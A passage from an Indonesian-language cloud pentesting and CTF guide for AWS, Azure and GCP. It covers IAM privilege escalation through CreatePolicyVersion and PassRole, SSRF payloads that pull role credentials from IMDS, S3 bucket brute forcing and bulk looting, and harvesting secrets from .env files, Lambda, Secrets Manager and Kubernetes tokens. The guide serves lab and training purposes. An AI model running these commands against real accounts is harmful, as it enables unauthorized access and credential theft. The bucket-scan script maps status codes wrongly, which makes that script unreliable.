|`iam:PassRole` + `ec2:*`|Menjalankan EC2 baru dengan admin instance-profile, lalu membaca metadata IMDS.|Menengah|
|`sts:AssumeRole`|Mengasumsikan role target yang memiliki konfigurasi trust relationship longgar.|Mudah|

---

### 7.2 Walkthrough: Eskalasi via `iam:CreatePolicyVersion`

Skenario: Anda memiliki akses ke user `developer-bob`. User ini hanya memiliki izin terbatas, namun memiliki hak `iam:CreatePolicyVersion` pada policy yang menempel di akunnya.

Bash

```
# 1. Tampilkan policy yang terpasang pada identitas kita
aws iam list-attached-user-policies --user-name developer-bob

# Misal policy ARN adalah: arn:aws:iam::123456789012:policy/DevCustomPolicy

# 2. Buat versi policy baru dengan hak akses superuser penuh (*)
aws iam create-policy-version \
  --policy-arn "arn:aws:iam::123456789012:policy/DevCustomPolicy" \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*"
      }
    ]
  }' \
  --set-as-default

# 3. Verifikasi eskalasi akses admin baru kita
aws iam list-users
aws s3 ls
```

---

## 🔎 Bagian 8: Automated Multi-Cloud Auditing

### 8.1 ScoutSuite (Multi-Cloud Audit)

ScoutSuite menggunakan API resmi cloud untuk mengambil data konfigurasi dan menghasilkan dashboard HTML visual interaktif yang menyorot area resiko keamanan (_security findings_).

Bash

```
# 1. Jalankan audit pada AWS menggunakan profile default
scout aws --profile default

# 2. Jalankan audit pada Microsoft Azure
scout azure --cli

# 3. Jalankan audit pada Google Cloud Platform
scout gcp --user-account

# 4. Membuka laporan hasil scanning di browser Parrot OS
firefox scoutsuite-report/scoutsuite-results/index.html &
```

---

### 8.2 Prowler (Security Assessment & Compliance)

Bash

```
# 1. Menjalankan scanning menyeluruh pada akun AWS aktif
prowler aws

# 2. Menjalankan pemeriksaan spesifik pada keamanan S3 Bucket
prowler aws --checks s3_bucket_public_access,s3_bucket_server_side_encryption

# 3. Menjalankan pemeriksaan konfigurasi MFA pada akun IAM
prowler aws --checks iam_root_mfa_enabled,iam_user_mfa_enabled

# 4. Ekspor hasil audit ke format HTML untuk pelaporan
prowler aws -M html
firefox output/prowler-output-*.html &
```

---

## 🗺️ Bagian 9: Master Cloud Enumeration Decision Tree

text

```
                       [ TARGET CLOUD DITEMUKAN ]
                                    │
         ┌──────────────────────────┴──────────────────────────┐
         ▼                                                     ▼
 [ MEMILIKI KREDENSIAL API ]                        [ TANPA KREDENSIAL / EXTERNAL ]
         │                                                     │
         ├► aws sts get-caller-identity                        ├► Cek HTTP Headers & SSL Issuer
         ├► Identifikasi Akun & User                           ├► s3_finder.sh (Brute force S3 names)
         │                                                     ├► Cek Public S3: --no-sign-request
         ├──► Hak IAM Terbuka?                                 ├► OSINT GitHub via TruffleHog
         │     ├── YES: list-user-policies                     └► Cek SSRF pada Web Application
         │     └── NO : Jalankan enumerate-iam                         │
         │                                                             ▼
         ├──► Cek Privilege Escalation Paths                     [ SSRF TERBUKA? ]
         │     └── CreatePolicyVersion / PassRole                      │
         │                                                             ▼
         ├──► Audit Resource Data:                               Curl 169.254.169.254 (IMDS)
         │     ├── S3: List & Sync isi bucket                          │
         │     ├── EC2: User Data & Security Groups                    ▼
         │     └── Secrets: SecretsManager & SSM                 [ DAPAT TEMPORARY KEYS ]
         │                                                             │
         └─────────────────────────────────────────────────────────────┘
```

---

## 🎯 Bagian 10: 8 Common CTF Cloud Patterns

### Pattern 1: Public S3 Bucket dengan Flag / File Backup

- **Indikasi / Trigger:** Web application memuat file gambar dari URL `https://company-assets.s3.amazonaws.com/logo.png`.
- **Command Akses:**
    
    Bash
    
    ```
    aws s3 ls s3://company-assets --no-sign-request
    aws s3 cp s3://company-assets/flag.txt . --no-sign-request
    ```
    
- **Hasil:** File flag tersimpan langsung tanpa perlu membuat akun AWS.

---

### Pattern 2: Ekstraksi Kredensial IMDSv1 Melalui Celah SSRF

- **Indikasi / Trigger:** Aplikasi web memiliki fitur render URL / PDF generator (`/generate?url=http://...`).
- **Payload SSRF:**
    
    http
    
    ```
    GET /generate?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AppRole HTTP/1.1
    Host: target.com
    ```
    
- **Hasil:** Web merender respons JSON yang memuat `AccessKeyId`, `SecretAccessKey`, dan `Token`.

---

### Pattern 3: Kredensial Hardcoded di File `.env` yang Terekspos

- **Indikasi / Trigger:** Directory brute forcing via gobuster menemukan file `.env` di root webserver.
- **Command:**
    
    Bash
    
    ```
    curl -s http://target.com/.env | grep -iE "AWS|SECRET|KEY"
    ```
    
- **Hasil:**
    
    text
    
    ```
    AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
    AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    ```
    

---

### Pattern 4: Konfigurasi Variabel Lingkungan di AWS Lambda

- **Indikasi / Trigger:** Kredensial memiliki akses ke command `lambda:ListFunctions`.
- **Command:**
    
    Bash
    
    ```
    aws lambda list-functions --output json
    aws lambda get-function-configuration --function-name "ProcessPayment"
    ```
    
- **Hasil:** Bagian `Environment.Variables` memuat password database produksi atau flag CTF.

---

### Pattern 5: IAM Role Escalation via `iam:PassRole` pada EC2 / Lambda

- **Indikasi / Trigger:** User memiliki izin `iam:PassRole` dan `lambda:CreateFunction` / `lambda:InvokeFunction`.
- **Command / Walkthrough Eksploitasi:**
    
    Bash
    
    ```bash
    # Step 1: List Lambda functions yang ada
    aws lambda list-functions --output table
    
    # Step 2: Cari Role dengan hak tinggi (misal admin) yang dapat di-pass
    aws iam list-roles --query 'Roles[?contains(RoleName,`admin`) || contains(RoleName,`Admin`)].{RoleName:RoleName,Arn:Arn}' --output table
    
    # Step 3: Buat Lambda function baru yang mengeksekusi payload command dan gunakan admin Role ARN
    aws lambda create-function \
      --function-name "debug-runner" \
      --runtime "python3.9" \
      --role "arn:aws:iam::123456789012:role/AdministratorRole" \
      --handler "index.handler" \
      --zip-file "fileb://function.zip"
    
    # Step 4: Invoke Lambda function untuk mengeksekusi perintah / dump secrets
    aws lambda invoke --function-name "debug-runner" --payload '{"cmd": "whoami"}' output.json
    cat output.json
    ```

---

### Pattern 6: Snapshot Database RDS / EBS yang Terbuka ke Publik

- **Indikasi / Trigger:** Akun target membagikan database snapshot secara tidak sengaja.
- **Command:**
    
    Bash
    
    ```bash
    aws rds describe-db-snapshots --snapshot-type public --output table
    ```
    
- **Hasil:** Database snapshot dapat di-restore di akun penyerang untuk membaca data SQL mentah.

---

### Pattern 7: Public AMI yang Memuat File Konfigurasi Sensitif

- **Indikasi / Trigger:** Challenge menyediakan akses ke image AMI kustom publik.
- **Command / Walkthrough Eksploitasi:**
    
    Bash
    
    ```bash
    # Step 1: Cari public AMI milik ID akun AWS target
    aws ec2 describe-images \
      --owners 123456789012 \
      --filters "Name=is-public,Values=true" \
      --query 'Images[*].[ImageId,Name,Description]' \
      --output table
    
    # Step 2: Launch EC2 instance dari AMI publik tersebut (menggunakan akun AWS milik pentester)
    aws ec2 run-instances \
      --image-id ami-0123456789abcdef0 \
      --instance-type t2.micro \
      --key-name my-pentest-key
    
    # Step 3: SSH ke instance dan periksa sisa artefak / history / credentials
    # ssh -i my-pentest-key.pem ubuntu@<PUBLIC_IP>
    # cat ~/.bash_history
    # find / -name "*.pem" -o -name "*.key" -o -name "*.env" 2>/dev/null
    ```

---

### Pattern 8: Kubernetes Service Account Token di Container Pod

- **Indikasi / Trigger:** Berhasil mendapatkan shell di dalam container AWS EKS / GCP GKE.
- **Command:**
    
    Bash
    
    ```
    cat /var/run/secrets/kubernetes.io/serviceaccount/token
    cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
    ```
    
- **Hasil:** Token JWT dapat digunakan untuk berkomunikasi langsung dengan Kubernetes API server internal.

---

## 🛠️ Bagian 11: Common Errors & Troubleshooting

|Pesan Error / Gejala|Akar Penyebab|Tindakan Solusi|
|---|---|---|
|`An error occurred (AccessDenied)`|IAM Policy secara eksplisit melarang aksi API tersebut.|Identifikasi permissions yang diizinkan menggunakan tool `enumerate-iam`.|
|`Unable to locate credentials`|AWS CLI tidak menemukan access key di env vars maupun config file.|Jalankan `aws configure` atau ekspor variabel `AWS_ACCESS_KEY_ID` & `AWS_SECRET_ACCESS_KEY`.|
|`The security token included in the request is invalid` (`InvalidClientTokenId`)|Format Access Key ID salah atau key telah dihapus/dinonaktifkan oleh admin.|Periksa kembali apakah ada karakter spasi yang terbawa saat copy-paste token.|
|`The security token included in the request is expired` (`ExpiredTokenException`)|Temporary session token (STS / IMDS) telah melewati batas masa aktif (_TTL expired_).|Ambil ulang token baru melalui endpoint metadata service atau jalankan ulang script STS.|
|`The config profile (target) could not be found`|Profile yang dipanggil dengan flag `--profile` belum didefinisikan di `~/.aws/config`.|Cek daftar profil yang terdaftar menggunakan: `aws configure list-profiles`.|
|`PermanentRedirect: The bucket you are attempting to access must be addressed using the specified endpoint`|Bucket berada di region yang berbeda dengan konfigurasi default AWS CLI kita.|Tentukan region eksplisit: `aws s3 ls s3://bucket-name --region eu-west-1`.|
|`Explicit denial / MFA required`|Akun mewajibkan Multi-Factor Authentication untuk menjalankan perintah sensitif.|Dapatkan session token MFA: `aws sts get-session-token --serial-number <ARN_MFA> --token-code <CODE>`.|
|`Request limit exceeded / ThrottlingException`|API request dikirim terlalu cepat sehingga terkena rate limiting provider.|Tambahkan jeda waktu (_sleep/delay_) pada script scanning atau gunakan tool `cloudfox`.|
|S3 Bucket mengembalikan status `403 Forbidden` pada CLI|Izin listing publik dimatikan, namun file langsung masih mungkin bisa didownload.|Coba download file spesifik: `aws s3 cp s3://bucket/index.html . --no-sign-request`.|
|Browser me-redirect request IMDS ke search engine|Browser desktop secara otomatis mengarahkan IP numerik lokal ke mesin pencari.|Selalu gunakan `curl` berbasis terminal untuk interaksi dengan `http://169.254.169.254/`.|

---

## 📋 Bagian 12: Cheatsheet Copy-Paste Ready

### 1. Identity & Account Verification

Bash

```
# Identifikasi informasi kredensial yang sedang aktif
aws sts get-caller-identity

# Verifikasi akun Azure aktif
az account show --output table

# Verifikasi akun Google Cloud aktif
gcloud auth list

# Tampilkan ringkasan konfigurasi profile AWS CLI
aws configure list
```

### 2. S3 Storage Enumeration

Bash

```
# Listing bucket publik tanpa autentikasi
aws s3 ls s3://TARGET_BUCKET_NAME --no-sign-request

# Listing seluruh isi bucket secara rekursif tanpa autentikasi
aws s3 ls s3://TARGET_BUCKET_NAME --recursive --no-sign-request

# Download seluruh isi bucket ke folder lokal
aws s3 sync s3://TARGET_BUCKET_NAME ./loot_dir --no-sign-request

# Listing bucket menggunakan kredensial aktif
aws s3 ls
```

### 3. IAM Enumeration

Bash

```
# Listing seluruh IAM users dalam format tabel
aws iam list-users --output table

# Listing seluruh managed policies yang terpasang pada user tertentu
aws iam list-attached-user-policies --user-name TARGET_USER

# Listing seluruh inline policies pada user tertentu
aws iam list-user-policies --user-name TARGET_USER

# Membaca isi detail dari sebuah inline policy
aws iam get-user-policy --user-name TARGET_USER --policy-name POLICY_NAME
```

### 4. EC2 & Network Discovery

Bash

```
# Menampilkan seluruh instance EC2 beserta IP publiknya
aws ec2 describe-instances --query 'Reservations[*].Instances[*].{ID:InstanceId,IP:PublicIpAddress,State:State.Name}' --output table

# Menampilkan Security Groups yang membuka port ke seluruh dunia (0.0.0.0/0)
aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].GroupName' --output table

# Ekstraksi User Data startup script instance EC2
aws ec2 describe-instance-attribute --instance-id INSTANCE_ID --attribute userData --query 'UserData.Value' --output text | base64 -d
```

### 5. Secrets Discovery

Bash

```
# Listing seluruh secret di AWS Secrets Manager
aws secretsmanager list-secrets --output table

# Membaca isi teks secret plaintext dari Secrets Manager
aws secretsmanager get-secret-value --secret-id SECRET_NAME --query 'SecretString' --output text

# Membaca parameter SSM Parameter Store secara rekursif
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption
```

### 6. Automated Multi-Cloud Audit Tools

Bash

```bash
# Menjalankan pemindaian konfigurasi AWS via ScoutSuite
scout aws --profile default

# Menjalankan security assessment cepat via Prowler
prowler aws --checks s3_bucket_public_access,iam_user_mfa_enabled

# Scanning secret leak pada direktori proyek menggunakan TruffleHog
trufflehog filesystem ./target_directory
```

### 7. IMDS (Instance Metadata Service)

Bash

```bash
# Cek ketersediaan IMDS (dari dalam EC2 atau via SSRF)
curl -s http://169.254.169.254/latest/meta-data/

# Ambil nama IAM Role yang terpasang di instance
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Dump full credentials dari IAM Role (IMDSv1)
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" | python3 -m json.tool

# Ambil token IMDSv2 (jika IMDSv1 diblokir)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"

# Cek user-data (startup script yang sering memuat password/secret)
curl -s http://169.254.169.254/latest/user-data/
```

---

# [☁️ Bagian 0: Fondasi Cloud Security](/docs/cloud-enum) — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah kecuali diarahkan.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET_IP="54.210.10.20"        # IP target cloud
export TARGET_DOMAIN="megacorp.com"    # Domain target
export LHOST="10.10.14.5"             # IP tun0 kamu
export LPORT="4444"
export AWS_DEFAULT_REGION="us-east-1"  # Sesuaikan jika tahu region target

mkdir -p ~/cloud_loot/{s3,iam,creds,keys,secrets,ec2,loot}
cd ~/cloud_loot

echo "[*] Target IP: $TARGET_IP | Domain: $TARGET_DOMAIN | LHOST: $LHOST"
```

**Output yang diharapkan:**

text

```
[*] Target IP: 54.210.10.20 | Domain: megacorp.com | LHOST: 10.10.14.5
```

---

## ═══════════════════════════════════════

## FASE 0: IDENTIFIKASI CLOUD PROVIDER

## ═══════════════════════════════════════

> **Tujuan:** Tentukan apakah target di AWS, Azure, atau GCP SEBELUM melakukan apapun. Ini menentukan tools dan teknik yang digunakan.

### Langkah 0.1 — Deteksi Provider via HTTP Headers

Bash

```
# Command 1: Cek header HTTP (paling cepat)
curl -I -s https://$TARGET_DOMAIN 2>/dev/null | grep -iE "server|x-amz|x-ms|x-goog|via|cf-ray"

# Command 2: Cek juga port 80 jika 443 tidak respond
curl -I -s http://$TARGET_DOMAIN 2>/dev/null | grep -iE "server|x-amz|x-ms|x-goog"

# Command 3: Cek IP langsung
curl -I -s http://$TARGET_IP 2>/dev/null | grep -iE "server|x-amz|x-ms|x-goog"
```

**OUTPUT BERHASIL ✅ — AWS terdeteksi:**

text

```
Server: AmazonS3
x-amz-request-id: 4B3D2F1A9E8C7B6A
x-amz-id-2: Uuag1LuByRx9e6j...
```

➡️ **Target di AWS.** Set variable:

Bash

```
export CLOUD_PROVIDER="AWS"
echo "[+] Cloud Provider: AWS" | tee -a ~/cloud_loot/findings.txt
```

➡️ Lanjut ke **Langkah 0.2**

**OUTPUT BERHASIL ✅ — Azure terdeteksi:**

text

```
Server: Microsoft-IIS/10.0
x-ms-request-id: a1b2c3d4-e5f6-...
x-ms-blob-type: BlockBlob
```

➡️ **Target di Azure.** Set variable:

Bash

```
export CLOUD_PROVIDER="AZURE"
echo "[+] Cloud Provider: Azure" | tee -a ~/cloud_loot/findings.txt
```

➡️ Lanjut ke **Langkah 0.2**

**OUTPUT BERHASIL ✅ — GCP terdeteksi:**

text

```
Server: UploadServer
x-goog-generation: 1234567890123456
x-guploader-uploadid: AHivW...
```

➡️ **Target di GCP.** Set variable:

Bash

```
export CLOUD_PROVIDER="GCP"
echo "[+] Cloud Provider: GCP" | tee -a ~/cloud_loot/findings.txt
```

**OUTPUT GAGAL ❌ — Header tidak jelas / generic:**

text

```
Server: nginx
```

➡️ Coba metode lain:

Bash

```
# Method 2: DNS CNAME lookup — cari jejak load balancer cloud
dig CNAME $TARGET_DOMAIN +short
dig CNAME www.$TARGET_DOMAIN +short

# Method 3: Cek apakah IP masuk range AWS
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json > /tmp/aws_ips.json
python3 -c "
import json, ipaddress
target = ipaddress.ip_address('$TARGET_IP')
data = json.load(open('/tmp/aws_ips.json'))
for prefix in data['prefixes']:
    try:
        if target in ipaddress.ip_network(prefix['ip_prefix']):
            print(f'[+] AWS! Region: {prefix[\"region\"]} | Service: {prefix[\"service\"]}')
            break
    except:
        pass
else:
    print('[-] Not in AWS IP ranges')
"

# Method 4: SSL certificate issuer
echo | openssl s_client -connect $TARGET_DOMAIN:443 -servername $TARGET_DOMAIN \
    2>/dev/null | openssl x509 -noout -issuer 2>/dev/null
```

**Output DNS CNAME yang mengungkap provider:**

text

```
# AWS ELB
target-lb-12345.us-east-1.elb.amazonaws.com.

# Azure
megacorp.blob.core.windows.net.

# GCP  
c.storage.googleapis.com.

# Cloudflare (CDN, bukan cloud hosting langsung)
megacorp.cdn.cloudflare.net.
```

> **📌 Jika Cloudflare:** Target mungkin tetap di AWS/Azure/GCP di belakang CDN. Cari IP origin via:

Bash

```
# Cari IP asli target dari certificate transparency
curl -s "https://crt.sh/?q=%.$TARGET_DOMAIN&output=json" | \
    jq -r '.[].name_value' | sort -u | head -20

# Coba akses direct ke IP (bypass Cloudflare)
# Searching: site:censys.io "$TARGET_DOMAIN" untuk IP asli
```

---

### Langkah 0.2 — Passive OSINT: Temukan Cloud Assets

Bash

```
# Command 1: Certificate Transparency — cari subdomain yang bocorkan asset cloud
curl -s "https://crt.sh/?q=%.$TARGET_DOMAIN&output=json" | \
    jq -r '.[].name_value' 2>/dev/null | \
    sort -u | \
    grep -iE "s3|blob|storage|api|cloud|dev|stage|prod|backup|assets|static" | \
    tee ~/cloud_loot/subdomains_cloud.txt

# Command 2: Google Dorks — cari public storage yang terekspos
# (Jalankan manual di browser)
echo "=== Google Dorks untuk $TARGET_DOMAIN ==="
echo "site:s3.amazonaws.com \"$TARGET_DOMAIN\""
echo "site:storage.googleapis.com \"$TARGET_DOMAIN\""
echo "site:blob.core.windows.net \"$TARGET_DOMAIN\""
echo "\"$TARGET_DOMAIN\" filetype:env OR filetype:json \"aws_access_key\""

# Command 3: TruffleHog — scan GitHub untuk leaked credentials
# (Butuh akun GitHub untuk rate limit lebih tinggi)
trufflehog github --org="$TARGET_DOMAIN" 2>/dev/null | tee ~/cloud_loot/trufflehog_github.txt
# Atau scan repo spesifik:
# trufflehog git https://github.com/megacorp/webapp.git
```

**OUTPUT BERHASIL ✅ — Subdomain cloud ditemukan:**

text

```
backup.s3.amazonaws.com
dev-assets.s3.amazonaws.com
megacorp-prod.blob.core.windows.net
```

➡️ Catat semua:

Bash

```
cat ~/cloud_loot/subdomains_cloud.txt
# Ekstrak nama bucket dari subdomain
cat ~/cloud_loot/subdomains_cloud.txt | \
    grep "s3.amazonaws.com" | \
    sed 's/.s3.amazonaws.com//' | \
    tee ~/cloud_loot/s3/potential_buckets.txt
```

**OUTPUT BERHASIL ✅ — TruffleHog menemukan credentials di GitHub:**

text

```
Found verified result 🐷🔑
Detector Type: AWS
Raw result: AKIAIOSFODNN7EXAMPLE
Commit: a1b2c3d4...
File: config/settings.py
```

➡️ **LANGSUNG TANGKAP!**

Bash

```
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
# TruffleHog biasanya juga tampilkan secret key
export AWS_SECRET_ACCESS_KEY="[secret dari output]"
echo "$AWS_ACCESS_KEY_ID:[SECRET]" > ~/cloud_loot/creds/leaked_creds.txt
```

➡️ Langsung lompat ke **Fase 2 (Credential Validation)**

**OUTPUT GAGAL ❌ — Tidak ada yang ditemukan:**

text

```
(empty output)
```

➡️ Lanjut ke **Fase 1 (Storage Enumeration)**. Mungkin bucket masih bisa di-brute force.

---

## ═══════════════════════════════════════

## FASE 1: STORAGE ENUMERATION (TANPA CREDENTIALS)

## ═══════════════════════════════════════

> **Tujuan:** Cari S3 bucket / Azure Blob / GCS yang bisa diakses publik tanpa credentials. Ini sering JACKPOT di CTF.

### Langkah 1.1 — Brute Force Nama Bucket S3

Bash

```
# Buat script generator nama bucket
cat > /tmp/s3_finder.sh << 'SCRIPT'
#!/bin/bash
TARGET="$1"
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <company_name>"
    exit 1
fi

PATTERNS=(
    "$TARGET"
    "$TARGET-backup" "$TARGET-backups" "$TARGET-bak"
    "$TARGET-data" "$TARGET-database" "$TARGET-db"
    "$TARGET-dev" "$TARGET-development" "$TARGET-staging"
    "$TARGET-prod" "$TARGET-production"
    "$TARGET-assets" "$TARGET-static" "$TARGET-media"
    "$TARGET-logs" "$TARGET-log"
    "$TARGET-internal" "$TARGET-private"
    "$TARGET-finance" "$TARGET-hr" "$TARGET-admin"
    "$TARGET-files" "$TARGET-uploads" "$TARGET-storage"
    "$TARGET-config" "$TARGET-conf" "$TARGET-configs"
    "$TARGET-secret" "$TARGET-secrets"
    "$TARGET-2023" "$TARGET-2024"
    "backup-$TARGET" "dev-$TARGET" "prod-$TARGET"
    "www-$TARGET" "api-$TARGET"
)

echo "[*] Scanning buckets untuk: $TARGET"
echo "----------------------------------------------"
for b in "${PATTERNS[@]}"; do
    URL="https://$b.s3.amazonaws.com"
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$URL/")
    
    case "$HTTP_CODE" in
        200) echo "[+] [200 PUBLIC LISTABLE] $URL" ;;
        201) echo "[!] [403 EXISTS/PRIVATE]  $URL" ;;
        202) echo "[~] [301 REGION REDIRECT] $URL" ;;
        # 404 = tidak ada, skip
    esac
done
SCRIPT

chmod +x /tmp/s3_finder.sh

# Jalankan dengan nama perusahaan target
COMPANY=$(echo $TARGET_DOMAIN | cut -d'.' -f1)
/tmp/s3_finder.sh "$COMPANY" | tee ~/cloud_loot/s3/bucket_scan.txt

# Alternatif: Gunakan s3scanner yang lebih cepat
s3scanner scan --buckets-file ~/cloud_loot/s3/potential_buckets.txt 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Bucket PUBLIC (200):**

text

```
[+] [200 PUBLIC LISTABLE] https://megacorp-backup.s3.amazonaws.com
```

➡️ **JACKPOT!** Langsung loot:

Bash

```
export BUCKET_NAME="megacorp-backup"
aws s3 ls "s3://$BUCKET_NAME" --no-sign-request
```

➡️ Lanjut ke **Langkah 1.2**

**OUTPUT BERHASIL ✅ — Bucket EXISTS tapi PRIVATE (403):**

text

```
[!] [403 EXISTS/PRIVATE]  https://megacorp-internal.s3.amazonaws.com
```

➡️ Bucket ada tapi butuh credentials. Catat nama bucket:

Bash

```
echo "megacorp-internal" >> ~/cloud_loot/s3/private_buckets.txt
# Jika nanti dapat credentials → coba akses bucket ini
```

➡️ Lanjut scan bucket lain, kemudian ke **Fase 2**

**OUTPUT GAGAL ❌ — Semua 404:**

text

```
(hanya 404, tidak ada yang 200 atau 403)
```

➡️ Perusahaan mungkin pakai naming convention berbeda. Coba:

Bash

```
# Coba dengan variasi: tanda titik, underscore
# megacorp.backup, megacorp_data, dll
# Atau cari di Shodan:
# shodan search "org:megacorp" "s3"

# Coba Azure Blob
for name in megacorp megacorp-backup megacorp-data; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
        "https://${name}.blob.core.windows.net/\$web/")
    [ "$code" != "404" ] && echo "[$code] Azure: $name"
done
```

---

### Langkah 1.2 — List & Download Isi Bucket Publik

Bash

```
# Command 1: List isi bucket secara rekursif
aws s3 ls "s3://$BUCKET_NAME" --no-sign-request --recursive | \
    sort -k3 -rn | \  # Sort by size, terbesar dulu
    tee ~/cloud_loot/s3/bucket_contents.txt

echo "[*] Total files: $(wc -l < ~/cloud_loot/s3/bucket_contents.txt)"
```

**OUTPUT BERHASIL ✅ — Ada file:**

text

```
2024-01-15 09:23:11    4521847 database_backup_2024.sql.gz
2024-01-14 14:11:02       1203 config/settings.json
2024-01-13 08:45:33      45231 employees/employee_list.xlsx
2024-01-12 19:33:21         89 flag.txt
2023-12-30 11:22:10     892034 backups/full_backup.zip
```

➡️ **Prioritaskan file berdasarkan nama:**

Bash

```
# Cari file sensitif dulu
grep -iE "flag|password|secret|key|\.sql|\.env|\.pem|\.bak|config|credential|\.kdbx" \
    ~/cloud_loot/s3/bucket_contents.txt

# Download file sensitif satu per satu dulu
aws s3 cp "s3://$BUCKET_NAME/flag.txt" ~/cloud_loot/loot/ --no-sign-request
aws s3 cp "s3://$BUCKET_NAME/config/settings.json" ~/cloud_loot/loot/ --no-sign-request
aws s3 cp "s3://$BUCKET_NAME/database_backup_2024.sql.gz" ~/cloud_loot/loot/ --no-sign-request

# Download SEMUA isi bucket (jika ukuran tidak terlalu besar)
aws s3 sync "s3://$BUCKET_NAME" ~/cloud_loot/s3/loot/ --no-sign-request
echo "[*] Download selesai. Size: $(du -sh ~/cloud_loot/s3/loot/)"

# Alternatif: TruffleHog scan langsung di bucket
trufflehog s3 --bucket="$BUCKET_NAME" 2>/dev/null | tee ~/cloud_loot/s3/trufflehog_s3.txt
```

**OUTPUT BERHASIL ✅ — TruffleHog menemukan credentials di dalam bucket:**

text

```
Found verified result 🐷🔑
Detector Type: AWS
AccessKeyId: AKIAIOSFODNN7EXAMPLE
SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

➡️ Set dan validasi credentials:

Bash

```
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
aws sts get-caller-identity
```

➡️ Langsung ke **Fase 2**

**OUTPUT GAGAL ❌ — Access Denied meski bucket publik:**

text

```
fatal error: An error occurred (403) when calling the HeadObject operation
```

➡️ Bucket boleh di-list tapi object tidak bisa di-download secara bulk. Coba satu per satu:

Bash

```
# Download file spesifik
aws s3 cp "s3://$BUCKET_NAME/specific-file.txt" . --no-sign-request

# Atau akses via HTTPS langsung
curl -s "https://$BUCKET_NAME.s3.amazonaws.com/specific-file.txt"
curl -s "https://s3.amazonaws.com/$BUCKET_NAME/specific-file.txt"
```

---

### Langkah 1.3 — Analisis File yang Didownload

Bash

```
cd ~/cloud_loot/s3/loot/

# Cari credentials di semua file
echo "=== Scanning untuk credentials ==="
grep -riE "(aws_access_key|aws_secret|api_key|password|secret|token|AKIA)" . 2>/dev/null | \
    grep -v "Binary" | head -50

# Cari file config dengan credentials
find . \( -name "*.env" -o -name "*.json" -o -name "*.yml" -o -name "*.yaml" \
         -o -name "*.config" -o -name "*.conf" -o -name "*.ini" \) 2>/dev/null | \
    xargs grep -liE "(key|secret|password|token)" 2>/dev/null

# Decompress jika ada file terkompresi
find . -name "*.gz" -exec gunzip {} \;
find . -name "*.zip" -exec unzip -o {} -d extracted/ \; 2>/dev/null
find . -name "*.tar*" -exec tar xf {} -C extracted/ \; 2>/dev/null

# Cek SQL dump untuk credentials/flags
if ls *.sql 2>/dev/null; then
    grep -iE "(password|secret|flag|admin|key)" *.sql | head -30
fi
```

**OUTPUT BERHASIL ✅ — Ketemu AWS credentials:**

text

```
./config/settings.json:  "AWS_ACCESS_KEY_ID": "AKIAIOSFODNN7EXAMPLE",
./config/settings.json:  "AWS_SECRET_ACCESS_KEY": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
```

➡️ Set credentials dan langsung ke **Fase 2**:

Bash

```
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
echo "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" >> ~/cloud_loot/creds/found_creds.txt
```

**OUTPUT BERHASIL ✅ — Ketemu flag CTF:**

text

```
./flag.txt: HTB{cl0ud_m1sc0nf1gur4t10n_1s_d4ng3r0us}
```

➡️ Submit flag! Tapi tetap lanjutkan eksplorasi untuk memahami attack path.

**OUTPUT GAGAL ❌ — Tidak ada yang menarik di bucket:**

text

```
(file hanya berisi gambar/asset statik)
```

➡️ Bucket ini bukan target utama. Coba scan nama bucket lain, atau lanjut ke **Fase 2** dengan credentials lain.

---

## ═══════════════════════════════════════

## FASE 2: CREDENTIAL VALIDATION & IDENTITY ENUMERATION

## ═══════════════════════════════════════

> **Masuk sini jika sudah punya AWS Access Key + Secret Key dari Fase 0 atau 1.**

### Langkah 2.1 — Validasi Credentials & Identifikasi Siapa Kita

Bash

```
# Command 1: WAJIB dijalankan pertama — siapa credentials ini?
aws sts get-caller-identity
```

**OUTPUT BERHASIL ✅ — IAM User:**

JSON

```
{
    "UserId": "AIDAI45678EXAMPLEUSER",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/developer-alex"
}
```

➡️ **Kita adalah IAM User `developer-alex`.** Simpan info:

Bash

```
export AWS_ACCOUNT_ID="123456789012"
export AWS_USERNAME="developer-alex"
export AWS_USER_ARN="arn:aws:iam::123456789012:user/developer-alex"
echo "Account: $AWS_ACCOUNT_ID | User: $AWS_USERNAME" >> ~/cloud_loot/creds/identity.txt
```

➡️ Lanjut ke **Langkah 2.2**

**OUTPUT BERHASIL ✅ — IAM Role (dari EC2/Lambda):**

JSON

```
{
